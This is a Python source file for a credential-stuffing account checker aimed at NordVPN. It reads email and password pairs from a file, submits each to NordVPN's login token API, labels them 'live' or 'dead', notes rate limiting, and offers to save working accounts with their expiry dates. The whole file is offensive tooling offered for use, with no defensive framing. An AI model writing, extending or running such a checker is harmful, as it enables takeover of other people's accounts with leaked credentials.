import requests, time
from os import sys

class Main:
    def __init__(self):
        self.url = "https://api.nordvpn.com/v1/users/tokens"
        self.data = {
            'checked': 0,
            'live': 0,
            'dead': 0,
            'save_live': False,
            'save_dead': False,
        }
        
    def checker(self, email, password):
        resp = requests.post(self.url, json={'username': email, 'password': password})
        
        
        if 'Too Many Requests' in resp.text:
            return {'process': False, 'message': 'Too Many Requests', 'data': {'email': email, 'password': password}}
    
        resp_json = resp.json()
    
        if resp_json.get('errors') != None:
            return {'process': False, 'message': resp_json['errors']['message'], 'data': {'email': email, 'password': password}}
        
        elif resp_json.get('user_id') != None:
            return {'process': True, 'data': {'email': email, 'password': password, 'expires_at': resp_json['expires_at']}}


        
    def read(self, filename):
        output = []
        with open(filename, 'rb') as file:
            for i in file.readlines():
                output.append(i.decode().replace('\n', '').replace('\r', ''))
            file.close()
        return output
    
    def getData(self):
        return self.data    
        
    def save_live(self):
        resp = input("=>> Save live accounts? [y/N]:  ")
        if resp.lower() == 'y':self.data['save_live'] = True
        elif resp.upper() == 'N':self.data['save_live'] = False
        else:
            print("\033[91m[!!] Invalid option\033[00m")
            sys.exit()
        time.sleep(2)
        
    def save_dead(self):
        resp = input("=>> Save dead accounts? [y/N]:  ")
        if resp.lower() == 'y':self.data['save_dead'] = True
        elif resp.upper() == 'N':self.data['save_dead'] = False
        else:
            print("\033[91m[!!] Invalid option\033[00m")
            sys.exit()
        time.sleep(2)